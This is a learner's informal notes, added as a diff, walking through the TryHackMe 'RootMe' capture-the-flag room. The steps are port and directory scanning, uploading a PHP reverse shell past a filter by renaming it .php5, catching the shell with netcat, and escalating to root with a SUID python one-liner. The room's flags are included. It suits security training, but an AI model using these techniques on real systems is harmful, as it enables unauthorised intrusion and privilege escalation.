@@ -1,0 +1,154 @@
+https://tryhackme.com/room/rrootme
+
+IP is 10.10.5.233 
+
+Task 1 is a joke. 
+Task 2
+1. Scan the machine, how many ports are open?  
+Starting with  nmap -sV 10.10.5.233 
+Port 22 and 80. 
+SSH and HTTP?
+
+
+
+2. What version of Apache is running?
+Because of the -sV we are able to see the apache version for the HTTP server.
+We have Apache httpd 2.4.29 ((Ubuntu))
+
+
+3. What service is running on port 22?
+This is a joke
+
+
+4. Find directories on the web server using the GoBuster tool.
+I didn’t have go buster, going to use because it just adds to the arsenal of tools in use.
+We have go buster, birbuster and nikito. Altghough nikito is for finding specific file types. 
+Not sure how to add a wordlist to go buster. 
+Working command gobuster dir -u 10.10.5.233 /usr/share/wordlists
+Better command is gobuster dir -u 10.10.5.233 /usr/share/wordlists/dirb/common.txt
+Ran into an error with the formatting
+gobuster dir -u 10.10.5.233 -w  /usr/share/wordlists/dirb/common.txt
+missing the -w in the command. Parsing now
+Found 
+/.htaccess            (Status: 403) [Size: 276]
+/.hta                 (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/css                  (Status: 301) [Size: 308] [--> http://10.10.5.233/css/]
+/index.php            (Status: 200) [Size: 616]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.5.233/js/]
+/panel                (Status: 301) [Size: 310] [--> http://10.10.5.233/panel/]
+/server-status        (Status: 403) [Size: 276]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.5.233/uploads/]
+
+
+What is the hidden directory?
+Brute forcing the answer, found /panel/ 
+http://10.10.5.233/panel/
+Shows a page to upload a file, weird. 
+
+
+Task 3 
+Find a form to upload and get a reverse shell, and find the flag.
+Hint Search for "file upload bypass" and "PHP reverse shell".
+Found https://pentestmonkey.net/tools/web-shells/php-reverse-shell in regards to a php reverse shell. 
+Downloaded the php script and did the ame thing done early with netcat.  I specified the machine ip and the hosting port. Php not permitted. 
+Need to explain why the php file was initially not permitted. Permitted after changing to php5
+Because the file uploaded successfully, we can setup out netcat listener.
+Curled the url’s uploads and found the fule.I can ls into the machine and find 
+Missing the syntax of the url.
+$ ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swap.img
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+
+
+I cant really access the good like root and bin, cant even use sudo. May need to escualte permissions? Got into bin somehow
+sudo: no tty present and no askpass program specified
+$ root cd
+/bin/sh: 15: root: not found
+$ /bin
+/bin/sh: 16: /bin: Permission denied
+$ sudo /home
+sudo: no tty present and no askpass program specified
+Wasn’t supposed to be in bin and got stuck in a permission loop. Weird how <> cannot be used when in netcat, found the text with a search, 
+Found /var/www/user.txt
+less /var/www/user.txt
+
+
+
+THM{y0u_g0t_a_sh3ll}
+
+
+Task 4
+Search for files with SUID permission, which file is weird? 
+find / -user root -perm /4000
+searched and a whole list of files and permission denied was given. 
+These are what stood out to me 
+/usr/bin/python
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+It was actually the python that got the answer correct.
+Found the command to run on the machine with 
+ python -c 'import os; os.system("/bin/sh")'
+Unusre why the python is throwing error, following https://www.youtube.com/watch?v=Bn8ufPXOwAQ
+Command was not working from the website or the youtube video. Foiund the acutla command in the comment section 
+listening on [any] 4444 ...
+connect to [10.2.98.64] from (UNKNOWN) [10.10.5.233] 42734
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 15:14:22 up  1:07,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ /usr/bin/ ./python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
+/bin/sh: 1: Syntax error: word unexpected (expecting ")")
+$ /usr/bin ./python -c 'import os; os.system("/bin/sh")'
+/bin/sh: 1: /usr/bin: Permission denied
+$ /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+whoami
+root
+Task 2
+Find a form to escalate your privileges.
+A joke
+Task 3
+
+Looked around the directory agin with root this time.
+Found root folder and just lessed the txt
+less /root/root.txt
+
+
+
+THM{pr1v1l3g3_3sc4l4t10n}
+
+
+
+
+
+
+
